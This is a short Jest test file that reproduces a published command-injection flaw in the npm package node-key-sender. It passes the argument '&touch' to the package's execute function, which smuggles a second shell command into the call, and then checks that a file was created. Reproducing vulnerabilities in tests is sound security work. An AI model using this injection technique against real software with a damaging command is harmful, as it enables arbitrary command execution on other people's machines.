//https://snyk.io/vuln/SNYK-JS-NODEKEYSENDER-564261
test("Command Injection in node-key-sender", () => 
{
	const root = require("node-key-sender");
	const fs = require('fs');
	const path = './node-key-sender';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let attack_code = ["&touch", "node-key-sender"];
	root.execute(attack_code);
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
